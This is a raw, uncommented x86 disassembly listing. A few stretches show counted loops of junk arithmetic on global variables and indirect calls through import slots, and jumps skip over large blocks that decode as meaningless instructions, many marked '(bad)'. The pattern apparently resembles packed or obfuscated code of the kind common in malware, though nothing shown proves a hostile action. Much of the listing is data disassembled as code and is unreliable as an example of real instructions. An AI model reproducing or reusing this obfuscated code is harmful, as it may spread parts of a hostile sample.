  4120a1:	es xchg esi,eax
  4120a3:	push   edi
  4120a4:	mov    edi,DWORD PTR [ebx-0x6a]
  4120a7:	mov    cl,0x22
  4120a9:	mov    eax,DWORD PTR [ebp+0x8]
  4120ac:	mov    eax,DWORD PTR [eax]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fd76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fcd5
  4120d3:	adc    DWORD PTR ds:0x42e6ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e6eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e703,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e6fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e6fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e6fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fd7e
  412121:	push   0x0
  412123:	push   0x42e26d
  412128:	call   DWORD PTR ds:0x42e483
  41212e:	mov    ebx,DWORD PTR ds:0x42e6fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e6fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e120,0x42fd01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	push   ss
  41216e:	push   ebp
  41216f:	push   0xffffffe5
  412171:	inc    esi
  412172:	pop    edi
  412173:	jo     0x4121e5
  412175:	mov    ecx,0xa970707e
  41217a:	rol    esp,1
  41217c:	stos   BYTE PTR es:[edi],al
  41217d:	adc    BYTE PTR [edi+edx*8+0x20],al
  412181:	add    BYTE PTR [ecx+0x65],bh
  412184:	(bad)  
  412185:	sbb    ah,BYTE PTR [eax-0x6a2371fe]
  41218b:	adc    BYTE PTR [edi+0x4e],dh
  41218e:	push   ds
  41218f:	mov    cl,BYTE PTR [edx+0x11db8508]
  412195:	cmp    dl,BYTE PTR [ebp-0x3a]
  412198:	jb     0x412129
  41219a:	xlat   BYTE PTR ds:[ebx]
  41219b:	sar    DWORD PTR [ecx],0x39
  41219e:	cli    
  41219f:	fwait
  4121a0:	imul   esi,DWORD PTR [ebx+0x2ec6d826],0xec4bd682
  4121aa:	jmp    0x12bf17c8
  4121af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121b0:	mov    cl,0xa0
  4121b2:	dec    eax
  4121b3:	xor    eax,0xa7a1ed89
  4121b8:	cli    
  4121b9:	ret    0xbed5
  4121bc:	and    BYTE PTR [edi+0x26adb927],dh
  4121c2:	fbstp  TBYTE PTR [edi]
  4121c4:	in     al,0x70
  4121c6:	scas   al,BYTE PTR es:[di]
  4121c8:	scas   eax,DWORD PTR es:[edi]
  4121c9:	fist   WORD PTR [eax+ebp*4+0x33]
  4121cd:	fild   WORD PTR [edi]
  4121cf:	mov    ecx,DWORD PTR [eax-0x2e]
  4121d2:	inc    esp
  4121d3:	fisttp DWORD PTR [ebx+0x43ddd01c]
  4121d9:	in     eax,dx
  4121da:	and    eax,0x1c1a4449
  4121df:	fiadd  WORD PTR [ebx-0x43]
  4121e2:	test   DWORD PTR [edi],ecx
  4121e4:	clc    
  4121e5:	mov    WORD PTR [eax+0x1b4b7a4f],fs
  4121eb:	dec    ebx
  4121ec:	sar    DWORD PTR [eax+0x2318e2d7],1
  4121f2:	mov    esi,0xcec49deb
  4121f7:	stos   DWORD PTR es:[edi],eax
  4121f8:	outs   dx,DWORD PTR ds:[esi]
  4121f9:	pop    ds
  4121fa:	xlat   BYTE PTR ds:[ebx]
  4121fb:	xlat   BYTE PTR ds:[ebx]
  4121fc:	push   ss
  4121fd:	xor    al,0xc5
  4121ff:	lods   eax,DWORD PTR ds:[esi]
  412200:	mov    dl,0xb
  412202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412203:	aad    0xc3
  412205:	mov    ds:0xe8f2a6f3,al
  41220a:	sbb    BYTE PTR [esi],dh
  41220c:	rol    BYTE PTR [esi+eiz*8],cl
  41220f:	ret    
  412210:	cld    
  412211:	ja     0x4121ca
  412213:	jne    0x412213
  412215:	jb     0x412269
  412217:	mov    esi,0x57dddcaa
  41221c:	sub    DWORD PTR [eax-0x17],edi
  41221f:	sub    eax,0x3e858e09
  412224:	pop    ebx
  412225:	xchg   esi,eax
  412226:	jl     0x4121fc
  412228:	xchg   edi,eax
  412229:	fcmovnb st,st(7)
  41222b:	mov    eax,ds:0xcefd9f74
  412230:	mov    bl,0xb3
  412232:	ja     0x4121d1
  412234:	adc    ah,al
  412236:	jecxz  0x4121e9
  412238:	sub    DWORD PTR [ebx],edi
  41223a:	xlat   BYTE PTR ds:[ebx]
  41223b:	jb     0x412233
  41223d:	ins    DWORD PTR es:[edi],dx
  41223e:	xor    eax,0xc37dfe03
  412244:	sub    ecx,DWORD PTR [ebx-0x13d4ed00]
  41224a:	and    al,0x40
  41224c:	lods   al,BYTE PTR ds:[esi]
  41224d:	push   cs
  41224e:	push   ss
  41224f:	outs   dx,DWORD PTR ds:[esi]
  412250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412251:	lock jnp 0x412265
  412254:	shl    BYTE PTR [edi+0x53e4c3ca],cl
  41225a:	popf   
  41225b:	xchg   BYTE PTR [ebx+0x15],dh
  41225e:	test   eax,0x9c0efe36
  412263:	lods   eax,DWORD PTR ds:[esi]
  412264:	xor    ax,0xbc9e
  412268:	cmc    
  412269:	dec    ecx
  41226a:	push   ss
  41226b:	add    BYTE PTR [edi-0x4141a823],bh
  412271:	pop    es
  412272:	and    esp,DWORD PTR [edi-0x6c9e812c]
  412278:	hlt    
  412279:	or     eax,0x941c2c54
  41227e:	jb     0x4122bf
  412280:	and    eax,0x59adee92
  412285:	jg     0x41228e
  412287:	jae    0x4122be
  412289:	mov    ch,0x53
  41228b:	popf   
  41228c:	add    bl,BYTE PTR [ecx]
  41228e:	(bad)  [esi+0x0]
  412291:	out    dx,al
  412292:	pop    ss
  412293:	pushf  
  412294:	pop    ebp
  412295:	cld    
  412296:	xchg   ebx,eax
  412297:	and    ecx,DWORD PTR [edx-0x6b0e9eda]
  41229d:	mov    edi,0x85340ff0
  4122a2:	test   DWORD PTR [edi-0x23a24ed2],esp
  4122a8:	std    
  4122a9:	xchg   edx,eax
  4122aa:	idiv   DWORD PTR [edi-0x6a27c7e]
  4122b0:	ret    0xc223
  4122b3:	xchg   esi,eax
  4122b4:	clc    
  4122b5:	fstp   TBYTE PTR [ebx-0x4491ccd]
  4122bb:	jmp    0x9649f8fa
  4122c0:	mov    eax,0x39c54b5
  4122c5:	stc    
  4122c6:	fsubr  st(3),st
  4122c8:	xchg   ebp,ebp
  4122ca:	and    BYTE PTR [ecx-0x72064124],ch
  4122d0:	dec    BYTE PTR [eax]
  4122d2:	outs   dx,DWORD PTR ds:[esi]
  4122d3:	xor    eax,0xa22511f2
  4122d8:	rcl    ebx,0x41
  4122db:	int    0x3c
  4122dd:	sub    BYTE PTR [edx-0x11ea494c],dh
  4122e3:	push   edx
  4122e4:	add    BYTE PTR [esi+0x12],0x77
  4122e8:	add    ebp,0xffffffe2
  4122eb:	push   0xef04dc5e
  4122f0:	xchg   edi,eax
  4122f1:	mov    eax,ds:0x6df4c76d
  4122f6:	jge    0x412366
  4122f8:	xor    dh,BYTE PTR [edx+0x76]
  4122fb:	sbb    bh,BYTE PTR [eax]
  4122fd:	fdiv   DWORD PTR [edx-0x3]
  412300:	mov    BYTE PTR [ebp+0x46],dh
  412303:	hlt    
  412304:	(bad)  
  412305:	repz sub dl,0xd8
  412309:	inc    esp
  41230a:	out    0x40,eax
  41230c:	out    dx,eax
  41230d:	xchg   ebp,eax
  41230e:	in     al,dx
  41230f:	jecxz  0x41235b
  412311:	(bad)  
  412312:	jmp    0x41238e
  412314:	repz mov eax,ds:0x62d1bc42
  41231a:	xor    BYTE PTR [ecx-0x43],ch
  41231d:	mov    al,0x42
  41231f:	fimul  DWORD PTR [eax-0x44]
  412322:	adc    BYTE PTR [esi],ah
  412324:	test   DWORD PTR [eax],0xd31c4f24
  41232a:	mov    ebp,0xa6f1abc4
  41232f:	push   ecx
  412330:	rol    DWORD PTR [edx],cl
  412332:	jmp    0x68cc263c
  412337:	leave  
  412338:	(bad)  
  412339:	jp     0x412314
  41233b:	pop    ss
  41233c:	test   al,0x82
  41233e:	shl    DWORD PTR [ebp-0x1a6cb250],0x92
  412345:	ss xchg ebx,eax
  412347:	pop    ss
  412348:	and    al,0xd7
  41234a:	fst    QWORD PTR [edi]
  41234c:	sub    BYTE PTR [edx-0x7d71951c],0x2e
  412353:	test   al,0x3a
  412355:	sub    DWORD PTR [edi-0x52942e0b],0x3e
  41235c:	ja     0x412331
  41235e:	dec    ebx
  41235f:	jmp    0x48c7:0x7a060ce
  412366:	dec    eax
  412367:	add    esi,DWORD PTR [ebp+eax*1-0x13]
  41236b:	mov    dh,0x6
  41236d:	icebp  
  41236e:	je     0x4123ca
  412370:	outs   dx,DWORD PTR ds:[esi]
  412371:	and    ebx,DWORD PTR [eax-0x4e9ed583]
  412377:	pushf  
  412378:	js     0x412359
  41237a:	inc    esi
  41237b:	mov    esi,esp
  41237d:	jo     0x41233b
  41237f:	outs   dx,BYTE PTR ds:[esi]
  412380:	push   ebp
  412381:	sbb    al,0x37
  412383:	sub    eax,0x75199ee0
  412388:	addr16 xchg edi,eax
  41238a:	or     BYTE PTR [ebx],ah
  41238c:	cmp    bl,BYTE PTR [ecx+0x45]
  41238f:	add    DWORD PTR [edx+0xb4ed259],esi
  412395:	fs ins BYTE PTR es:[edi],dx
  412397:	adc    DWORD PTR [ebx],0x87b983f
  41239d:	mov    ah,0x4c
  41239f:	test   al,0x25
  4123a1:	jb     0x4123d1
  4123a3:	mov    bl,0xc0
  4123a5:	jp     0x4123e8
  4123a7:	add    DWORD PTR [eax],ebx
  4123a9:	mov    dh,0x99
  4123ab:	in     al,dx
  4123ac:	and    BYTE PTR [ebp+eax*8+0x10431e59],bl
  4123b3:	inc    ecx
  4123b4:	add    ch,ah
  4123b6:	je     0x412353
  4123b8:	and    esp,DWORD PTR [ebx-0x24b47c18]
  4123be:	mov    DWORD PTR [edi],ebx
  4123c0:	pop    esi
  4123c1:	cmp    ebp,DWORD PTR [ebp-0x52]
  4123c4:	mov    cl,0x81
  4123c6:	adc    al,0x3e
  4123c8:	mov    DWORD PTR [edx-0x4e],ebx
  4123cb:	push   edx
  4123cc:	mov    eax,0x8a7a0cc1
  4123d1:	sub    ebp,DWORD PTR [ebx-0x715a12c3]
  4123d7:	add    DWORD PTR [ecx+0x3c601a1c],ecx
  4123dd:	push   DWORD PTR [esi-0x26]
  4123e0:	mov    dh,BYTE PTR [ebx+0x5c0547f8]
  4123e6:	in     al,0x81
  4123e8:	sbb    dh,BYTE PTR [edx]
  4123ea:	mov    ebp,0x8fb0f4f8
  4123ef:	sbb    DWORD PTR [edi+0x1c2e8349],esp
  4123f5:	test   BYTE PTR [ebp+0x7],0xfd
  4123f9:	clc    
  4123fa:	mov    dh,0xa6
  4123fc:	in     al,0xd1
  4123fe:	xchg   esp,eax
  4123ff:	dec    esp
  412400:	push   ss
  412401:	retf   
  412402:	add    al,0x87
  412404:	add    eax,0x2068da62
  412409:	inc    esp
  41240a:	mov    ah,0xc1
  41240c:	rcl    DWORD PTR [ebx-0x7753cb4f],0x4f
  412413:	cmp    DWORD PTR [edi-0x35a8c2ed],ecx
  412419:	test   eax,0x915b5464
  41241e:	jbe    0x41243f
  412420:	mov    dl,0xbf
  412422:	daa    
  412423:	fst    QWORD PTR [ebx+0x7]
  412426:	mov    ebx,0xdabc2df
  41242b:	ficom  WORD PTR [edx+eiz*4+0x76]
  41242f:	mov    dl,0x4c
  412431:	lahf   
  412432:	xchg   ecx,eax
  412433:	mov    eax,ds:0xfbdac226
  412438:	out    dx,al
  412439:	xor    ecx,DWORD PTR [esi]
  41243b:	cld    
  41243c:	fisttp QWORD PTR [esi]
  41243e:	jg     0x412436
  412440:	add    ecx,ebx
  412442:	sub    DWORD PTR ds:0x42fcf9,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	push   eax
  41245e:	inc    esi
  41245f:	test   BYTE PTR [edx-0x71],dh
  412462:	pop    esp
  412463:	jo     0x4124d5
  412465:	mov    ecx,0xd070707e
  41246a:	inc    esi
  41246b:	jbe    0x4124d5
  41246d:	pusha  
  41246e:	fisubr DWORD PTR [ebx]
  412470:	mov    esi,0x8f89ccce
  412475:	lods   eax,DWORD PTR ds:[esi]
  412476:	daa    
  412477:	jg     0x412453
  412479:	outs   dx,BYTE PTR ds:[esi]
  41247a:	push   ds
  41247b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41247c:	xchg   esp,eax
  41247d:	cmp    ah,BYTE PTR gs:[edi]
  412480:	sbb    dh,cl
  412482:	jl     0x412484
  412484:	shl    BYTE PTR [edx-0x23],1
  412487:	xchg   ecx,eax
  412488:	popf   
  412489:	mov    edx,0x241546b4
  41248e:	sbb    DWORD PTR [edi+0x58],edx
  412491:	ds enter 0x265c,0x78
  412496:	shl    DWORD PTR [edi],cl
  412498:	in     al,0xbe
  41249a:	pusha  
  41249b:	push   esp
  41249c:	xor    bh,BYTE PTR [ecx]
  41249e:	icebp  
  41249f:	aaa    
  4124a0:	adc    edi,0x6d
  4124a3:	outs   dx,BYTE PTR ds:[esi]
  4124a4:	bound  esp,QWORD PTR es:[esi+0x7c]
  4124a8:	enter  0x2f1c,0x8c
  4124ac:	or     bl,ch
  4124ae:	or     al,0xb8
  4124b0:	mov    edi,0x8b49aab4
  4124b5:	popa   
  4124b6:	jbe    0x41243d
  4124b8:	inc    edi
  4124b9:	add    DWORD PTR [ecx-0x4],ebp
  4124bc:	inc    ecx
  4124bd:	lahf   
  4124be:	jl     0x41245b
  4124c0:	pop    ds
  4124c1:	or     BYTE PTR [esi-0x74015be0],ah
  4124c7:	jmp    0x4124aa
  4124c9:	add    al,0xcb
  4124cb:	ror    BYTE PTR [eax],0xaf
  4124ce:	mov    BYTE PTR [ebp+0x6b],dh
  4124d1:	retf   
  4124d2:	test   BYTE PTR [ebp+ebx*1+0x28],ch
  4124d6:	jno    0x412475
  4124d8:	cdq    
  4124d9:	inc    eax
  4124da:	xchg   DWORD PTR [eax],edx
  4124dc:	mov    cl,0x69
  4124de:	xchg   BYTE PTR [esi],bl
  4124e0:	in     eax,dx
  4124e1:	jae    0x4124d6
  4124e3:	daa    
  4124e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124e5:	and    BYTE PTR [esi+eax*8],bl
  4124e8:	adc    BYTE PTR [esi],bh
  4124ea:	ins    DWORD PTR es:[edi],dx
  4124eb:	mov    dl,0x61
  4124ed:	mov    ds:0x68010c94,eax
  4124f2:	add    al,0x65
  4124f4:	in     al,dx
  4124f5:	dec    esp
  4124f6:	cmc    
  4124f7:	fisttp DWORD PTR [ecx+0x5]
  4124fa:	lods   eax,DWORD PTR ds:[esi]
  4124fb:	(bad)  
  4124fc:	int    0x3d
  4124fe:	mov    WORD PTR [ebp+eax*1-0x5],cs
  412502:	mov    ah,BYTE PTR [edx+0x4115246]
  412508:	or     dl,bl
  41250a:	jnp    0x412560
  41250c:	jecxz  0x4124f6
  41250e:	dec    edx
  41250f:	xor    al,0x1a
  412511:	cs into 
  412513:	pop    ss
  412514:	and    esi,DWORD PTR [ecx+0x15]
  412517:	sub    ebx,edi
  412519:	loop   0x4124fd
  41251b:	pop    esp
  41251c:	into   
  41251d:	push   edx
  41251e:	xor    BYTE PTR [ebx-0x4f7f9cfa],cl
  412524:	xchg   edi,eax
  412525:	into   
  412526:	cld    
  412527:	jae    0x412582
  412529:	out    dx,al
  41252a:	sub    DWORD PTR [edi],edi
  41252c:	sub    al,0x38
  41252e:	loop   0x41259e
  412530:	mov    edi,0x8b37396e
  412535:	mov    ecx,DWORD PTR [esi]
  412537:	add    ah,BYTE PTR [ecx*1-0x5db7c297]
  41253e:	ja     0x4125b1
  412540:	repnz xchg ecx,eax
  412542:	and    DWORD PTR [esi],eax
  412544:	push   ecx
  412545:	mov    eax,ds:0xaee5f2be
  41254a:	inc    edi
  41254b:	mov    al,ds:0xe5c8822
  412550:	fdivr  DWORD PTR [edx+0x11]
  412553:	sbb    DWORD PTR [ebp+0x62],ecx
  412556:	add    BYTE PTR [eax],ch
  412558:	and    BYTE PTR [edx+eax*8],ah
  41255b:	xchg   edi,eax
  41255c:	popf   
  41255d:	repnz push ebx
  41255f:	stos   DWORD PTR es:[edi],eax
  412560:	jne    0x41251a
  412562:	dec    esi
  412563:	dec    esi
  412564:	jp     0x4125c4
  412566:	outs   dx,BYTE PTR es:[esi]
  412568:	aaa    
  412569:	cmc    
  41256a:	enter  0x382a,0xe3
  41256e:	inc    edx
  41256f:	or     DWORD PTR [esi+0x69],esp
  412572:	pushf  
  412573:	mov    ds:0x724bfe22,al
  412578:	push   edi
  412579:	fist   DWORD PTR cs:[edx+0x1f]
  41257d:	jle    0x4125ab
  41257f:	cmp    eax,0x10ae2a9d
  412584:	ins    BYTE PTR es:[edi],dx
  412585:	les    esi,FWORD PTR [edi]
  412587:	ret    0x506f
  41258a:	(bad)
  41258d:	hlt    
  41258e:	dec    ebp
  41258f:	or     bl,ch
  412591:	(bad)
  412594:	mov    DWORD PTR [ecx-0x41394220],eax
  41259a:	mov    edx,0x5b3e7bf
  41259f:	mov    BYTE PTR [edi],dh
  4125a1:	mov    edx,0xab847464
  4125a6:	sub    bh,ah
  4125a8:	push   0xffffffd7
  4125aa:	cpuid  
  4125ac:	pop    es
  4125ad:	and    ah,BYTE PTR [ecx-0x5bc3eb31]
  4125b3:	(bad)  
  4125b4:	das    
  4125b5:	add    BYTE PTR [edi-0x2d],bh
  4125b8:	imul   eax,edi,0xdf212c56
  4125be:	test   eax,0x17764438
  4125c3:	lea    edi,[ebx+0x62]
  4125c6:	outs   dx,BYTE PTR ds:[esi]
  4125c7:	(bad)  
  4125c8:	clc    
  4125c9:	jecxz  0x41255f
  4125cb:	push   esp
  4125cc:	aas    
  4125cd:	ja     0x412565
  4125cf:	out    dx,al
  4125d0:	fidiv  DWORD PTR [edi+0x23ebbc8b]
  4125d6:	xor    eax,0x5877daeb
  4125db:	mov    ch,0x98
  4125dd:	data16 sti 
  4125df:	cs es gs push ss
  4125e3:	mov    bl,0x41
  4125e5:	cdq    
  4125e6:	addr16 pushf 
  4125e8:	add    al,0xab
  4125ea:	inc    esp
  4125eb:	in     eax,0x5b
  4125ed:	jecxz  0x4125bc
  4125ef:	scas   al,BYTE PTR es:[edi]
  4125f0:	mov    esp,0x2a2f606c
  4125f5:	xor    DWORD PTR [edi],edi
  4125f7:	hlt    
  4125f8:	sub    ah,BYTE PTR [ebx-0x4bb6bcee]
  4125fe:	sar    DWORD PTR [edx+0x2686db84],1
  412604:	pop    eax
  412605:	jno    0x4125c6
  412607:	pop    ds
  412608:	fcomi  st,st(4)
  41260a:	add    ecx,DWORD PTR ds:0xe676c8a6
  412610:	cli    
  412611:	push   edi
  412612:	mov    eax,ds:0x490dd89d
  412617:	mov    ebx,0x1d057400
  41261c:	pop    es
  41261d:	aam    0xd0
  41261f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412620:	mov    esp,0xab622be1
  412625:	lahf   
  412626:	mov    cl,0xd1
  412628:	into   
  412629:	inc    edi
  41262a:	adc    al,0x69
  41262c:	mov    DWORD PTR [edi],eax
  41262e:	fnstenv [eax]
  412630:	push   0x21a7ff90
  412635:	dec    ecx
  412636:	out    0xc6,al
  412638:	out    dx,al
  412639:	or     DWORD PTR [eax+0x8],ebp
  41263c:	push   0x879a4bc9
  412641:	jle    0x412657
  412643:	pop    edx
  412644:	imul   ebx,DWORD PTR [ecx+ebx*2+0x5b],0x28
  412649:	jne    0x4125f3
  41264b:	push   edx
  41264c:	fstp   TBYTE PTR ds:0x107aba6e
  412652:	pop    edi
  412653:	fisub  DWORD PTR [ecx+0x19d551c8]
  412659:	sar    DWORD PTR [ebp-0x5a],cl
  41265c:	call   0xf0f1eef6
  412661:	in     eax,0x1c
  412663:	mov    dh,0x8c
  412665:	xor    eax,0xe32e7f40
  41266a:	retf   
  41266b:	sbb    bh,BYTE PTR [eax+0x57]
  41266e:	scas   al,BYTE PTR es:[edi]
  41266f:	mov    ebx,0x7bd2fda1
  412674:	jge    0x4126aa
  412676:	sub    al,0x6f
  412678:	into   
  412679:	push   0xffffffe1
  41267b:	mov    esi,0xd59f9919
  412680:	mov    DWORD PTR [edi-0x29279877],ebp
  412686:	push   ds
  412687:	mov    esp,0x6e1141c2
  41268c:	scas   al,BYTE PTR es:[edi]
  41268d:	popa   
  41268e:	pop    esi
  41268f:	mov    bh,0x2a
  412691:	push   esp
  412692:	in     eax,0x5
  412694:	adc    DWORD PTR [ebp+ecx*8+0x7e],ecx
  412698:	jb     0x4126a1
  41269a:	in     al,dx
  41269b:	arpl   dx,bp
  41269d:	cmp    ecx,eax
  41269f:	push   ebp
  4126a0:	xor    dl,BYTE PTR [esi]
  4126a2:	push   esp
  4126a3:	rol    DWORD PTR [esp+ecx*2],1
  4126a6:	mov    ecx,esi
  4126a8:	jmp    0x4126bd
  4126aa:	xchg   esi,eax
  4126ab:	in     eax,0xf0
  4126ad:	lahf   
  4126ae:	adc    BYTE PTR [esi],ah
  4126b0:	add    bh,BYTE PTR [edx+0x19]
  4126b3:	cwde   
  4126b4:	popf   
  4126b5:	push   0x8e09c09a
  4126ba:	test   DWORD PTR ds:0x70235369,esi
  4126c0:	xor    ecx,DWORD PTR [ebp-0x8]
  4126c3:	and    edi,DWORD PTR ds:[esi]
  4126c6:	mov    DWORD PTR [eax-0x63],ecx
  4126c9:	lea    edi,[edi-0x6c]
  4126cc:	adc    al,0x7f
  4126ce:	inc    edx
  4126cf:	imul   edx,DWORD PTR [ebx],0xffffffe4
  4126d2:	loope  0x4126ab
  4126d4:	xchg   edi,eax
  4126d5:	mov    es,WORD PTR [eax+0x58a33cdc]
  4126db:	xchg   BYTE PTR [edx-0x391801b9],ch
  4126e1:	imul   esp,DWORD PTR [esi+0x161a6943],0x4a
  4126e8:	pop    esi
  4126e9:	dec    edx
  4126ea:	pusha  
  4126eb:	xchg   ebp,eax
  4126ec:	sub    ah,BYTE PTR ds:0xf4fa0df5
  4126f2:	ret    0x133a
  4126f5:	jbe    0x412687
  4126f7:	inc    edx
  4126f8:	xlat   BYTE PTR ds:[ebx]
  4126f9:	add    BYTE PTR [eax+0x29f5b170],cl
  4126ff:	dec    edx
  412700:	push   DWORD PTR [ecx]
  412702:	retf   0xbce8
  412705:	mov    cl,0x94
  412707:	jb     0x4126c8
  412709:	dec    edx
  41270a:	push   0xffffffdc
  41270c:	cmp    al,0x47
  41270e:	mov    dl,0x43
  412710:	scas   al,BYTE PTR es:[edi]
  412711:	or     bh,BYTE PTR ds:0xc158638e
  412717:	daa    
  412718:	push   edi
  412719:	ja     0x41274a
  41271b:	stos   BYTE PTR es:[edi],al
  41271c:	(bad)  
  41271e:	out    dx,al
  41271f:	dec    esi
  412720:	adc    DWORD PTR [edx+esi*2+0x6d],ecx
  412724:	xor    al,0x4f
  412726:	xchg   esp,eax
  412727:	mov    cl,0x21
  412729:	push   0xffffffa0
  41272b:	pop    esi
  41272c:	inc    edx
  41272d:	lock or eax,0xe44d8939
  412733:	and    DWORD PTR ds:0x42fd76,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fd76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fd76,ecx
  412751:	cmp    DWORD PTR ds:0x42fd76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fd76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e313
  41277c:	cmp    DWORD PTR ds:0x42fd76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fd76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fd76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fd6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    esp,DWORD PTR [ebx]
  4127be:	mov    bh,0x6b
  4127c0:	mov    cs,eax
  4127c2:	pop    ecx
  4127c3:	jo     0x412835
  4127c5:	mov    ecx,0xe970707e
  4127ca:	mov    bl,0x2c
  4127cc:	clc    
  4127cd:	stos   DWORD PTR es:[edi],eax
  4127ce:	push   eax
  4127cf:	and    dh,dh
  4127d1:	call   0xa60b:0xae1038b7
  4127d8:	mov    ebp,0x7696ebdd
  4127dd:	cmp    eax,0xe470b183
  4127e2:	adc    ebx,esi
  4127e4:	in     eax,0x86
  4127e6:	xor    esi,ecx
  4127e8:	push   ebx
  4127e9:	mov    ch,0x41
  4127eb:	cs add al,0x6
  4127ee:	sbb    eax,0x181df43b
  4127f3:	ds dec eax
  4127f5:	sbb    eax,0xecf71e0
  4127fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127fb:	xchg   ecx,eax
  4127fc:	fs mov ch,0x68
  4127ff:	pop    ecx
  412800:	fsub   st,st(7)
  412802:	fcomp  st(1)
  412804:	or     al,0x1d
  412806:	loope  0x412841
  412808:	jnp    0x41278d
  41280a:	fdiv   QWORD PTR [ebp-0x5a]
  41280d:	sbb    cl,BYTE PTR [ebx+0x33b92577]
  412813:	imul   ch
  412815:	imul   ebx,DWORD PTR [eax+0x56],0x725dc467
  41281c:	jle    0x4127cc
  41281e:	mov    edi,0xc0b771e2
  412823:	adc    DWORD PTR [edx+0x15ac706f],edx
  412829:	gs mov eax,0xdc89647b
  41282f:	mov    bl,0x97
  412831:	sub    DWORD PTR [eax-0x40],0x11986a6d
  412838:	xor    bl,al
  41283a:	sti    
  41283b:	add    dh,dh
  41283d:	mov    esp,0xc2a1e6d1
  412842:	ret    0xbcc8
  412845:	retf   0x92ba
  412848:	xlat   BYTE PTR ds:[ebx]
  412849:	cmp    ah,bh
  41284b:	mov    ecx,DWORD PTR [ecx]
  41284d:	in     al,0xf0
  41284f:	or     al,0xec
  412851:	jg     0x412852
  412853:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412854:	xchg   edi,eax
  412855:	stos   BYTE PTR es:[edi],al
  412856:	addr16 mov ebp,edi
  412859:	adc    ah,BYTE PTR [edx+0x7b8c00f0]
  41285f:	mov    ah,0xa5
  412861:	push   ebx
  412862:	push   edi
  412863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412864:	xchg   esp,eax
  412865:	sahf   
  412866:	repnz sar WORD PTR [ecx],1
  41286a:	ret    
  41286b:	fs leave 
  41286d:	je     0x41287c
  41286f:	jmp    0x792:0xc7cb5ccc
  412876:	(bad)  [ebx-0x3d]
  412879:	mov    bl,0x3f
  41287b:	cs push ecx
  41287d:	stos   BYTE PTR es:[edi],al
  41287e:	jns    0x412896
  412880:	add    al,0x9b
  412882:	fistp  DWORD PTR [ebx]
  412884:	ds scas al,BYTE PTR es:[edi]
  412886:	mov    bl,0x2e
  412888:	pop    ebx
  412889:	idiv   DWORD PTR ds:[esp+esi*2-0x6d]
  41288e:	inc    esp
  41288f:	push   0x516959eb
  412894:	pop    esi
  412895:	xchg   esp,eax
  412896:	cwde   
  412897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412898:	(bad)  
  412899:	sar    ecx,1
  41289b:	or     edx,DWORD PTR [ebx+0x2b]
  41289e:	fdiv   QWORD PTR [edi]
  4128a0:	cmp    eax,0x5b260206
  4128a5:	or     ebp,ecx
  4128a7:	pop    edi
  4128a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128a9:	xlat   BYTE PTR ds:[ebx]
  4128aa:	loope  0x4128ef
  4128ac:	in     al,0x28
  4128ae:	xchg   DWORD PTR [eax-0x7b933f9e],ebx
  4128b4:	sbb    eax,0x71360d4f
  4128b9:	xchg   ecx,eax
  4128ba:	jne    0x4128ce
  4128bc:	fwait
  4128bd:	push   eax
  4128be:	pop    eax
  4128bf:	mov    al,0xb2
  4128c1:	sti    
  4128c2:	aad    0x86
  4128c4:	(bad)  
  4128c5:	dec    ebp
  4128c6:	je     0x412872
  4128c8:	das    
  4128c9:	jb     0x41287c
  4128cb:	cdq    
  4128cc:	rcl    DWORD PTR [ecx-0x3d6f06e6],1
